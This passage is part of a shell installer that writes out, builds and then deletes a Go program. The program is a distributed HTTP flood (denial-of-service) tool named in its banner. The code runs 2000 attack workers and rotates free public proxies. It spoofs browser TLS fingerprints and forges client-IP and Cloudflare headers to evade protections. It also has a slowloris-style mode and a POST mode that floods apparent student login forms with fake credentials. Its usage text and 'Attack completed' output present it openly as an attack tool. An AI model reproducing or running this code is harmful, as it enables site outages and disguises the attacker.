		{"X-Client-Version": "2.5.0"},
		{"X-App-Version": "4.2.1"},
		{"X-Platform": "web"},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
    {
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateNever,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:                     http.ProxyURL(proxyURL),
					TLSClientConfig:           getRandomizedTLSConfig(),
					MaxIdleConns:              100,
					MaxIdleConnsPerHost:       100,
					MaxConnsPerHost:           0,
					IdleConnTimeout:           120 * time.Second,
					ResponseHeaderTimeout:     30 * time.Second,
					ExpectContinueTimeout:     1 * time.Second,
					DisableKeepAlives:         false,
					DisableCompression:        false,
					MaxResponseHeaderBytes:    1 << 20,
					WriteBufferSize:           4096,
					ReadBufferSize:            4096,
					ForceAttemptHTTP2:         true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:           getRandomizedTLSConfig(),
		MaxIdleConns:              100,
		MaxIdleConnsPerHost:       100,
		MaxConnsPerHost:           0,
		IdleConnTimeout:           120 * time.Second,
		ResponseHeaderTimeout:     30 * time.Second,
		ExpectContinueTimeout:     1 * time.Second,
		DisableKeepAlives:         false,
		DisableCompression:        false,
		MaxResponseHeaderBytes:    1 << 20,
		WriteBufferSize:           4096,
		ReadBufferSize:            4096,
		ForceAttemptHTTP2:         true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println("")
	fmt.Println("███████╗██╗░░░██╗██████╗░███████╗██████╗░")
	fmt.Println("██╔════╝╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗")
	fmt.Println("█████╗░░░╚████╔╝░██████╔╝█████╗░░██║░░██║")
	fmt.Println("██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══╝░░██║░░██║")
	fmt.Println("███████╗░░░██║░░░██║░░░░░███████╗██████╔╝")
	fmt.Println("╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═════╝░")
	fmt.Println("")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql", "wp-login.php",
		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
		"/.env", "/config.json", "/settings.ini", "/application.yml", 
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(32)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_id=%d", randInt(1000, 99999)))
	}
	if randBool() {
		langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func generateCloudflareIP() string {
	firstOctet := []int{173, 103, 141, 108, 104, 172, 162, 188}[randInt(0, 7)]
	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, randInt(0, 255), randInt(0, 255), randInt(1, 254))
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST")
		fmt.Println("  ./main https://target.com 30 HEAD")
		fmt.Println("  ./main https://target.com 60 SLOW")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	fmt.Println("[+] Starting... Press Ctrl+C to stop")

	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, "")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	const workers = 2000

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, useProxy, connectionPool)
		}()
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")

			randomSpoofIP := randomIP()
			req.Header.Set("X-Forwarded-For", randomSpoofIP)
			req.Header.Set("X-Real-IP", randomSpoofIP)
			req.Header.Set("X-Originating-IP", randomIP())
			req.Header.Set("X-Remote-IP", randomIP())
			req.Header.Set("X-Remote-Addr", randomIP())
			req.Header.Set("X-Client-IP", randomIP())
			req.Header.Set("True-Client-IP", randomSpoofIP)

			// Cloudflare Headers
			if randInt(1, 100) <= 50 {
				cfIP := generateCloudflareIP()
				req.Header.Set("CF-Connecting-IP", cfIP)
				req.Header.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "CA", "AU", "JP", "SG"}[randInt(0, 7)])
				req.Header.Set("CF-Ray", randomString(16)+"-"+randomString(8))
			}

			// Security Headers
			numSecurity := randInt(2, 4)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			// Modern Headers
			numModern := randInt(3, 6)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}

				// App Headers
			if randInt(1, 100) <= 60 {
				numApp := randInt(2, 4)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							switch k {
							case "X-CSRF-Token":
								req.Header.Set(k, randomString(32))
							case "Authorization":
								req.Header.Set(k, "Bearer "+randomString(48))
							case "X-API-Key":
								req.Header.Set(k, randomString(24))
							case "X-Device-ID", "X-Session-ID":
								req.Header.Set(k, randomString(32))
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

						// CDN Headers
			if randInt(1, 100) <= 40 {
				cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
				for k, v := range cdnHeader {
					req.Header.Set(k, v)
				}
			}		

			// Cookies
			if randInt(1, 100) <= 60 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			// Range requests
			if randInt(1, 100) <= 20 {
				req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", randInt(0, 1000), randInt(1001, 100000)))
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

sed -i "s/'/\"/g" main.go 

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
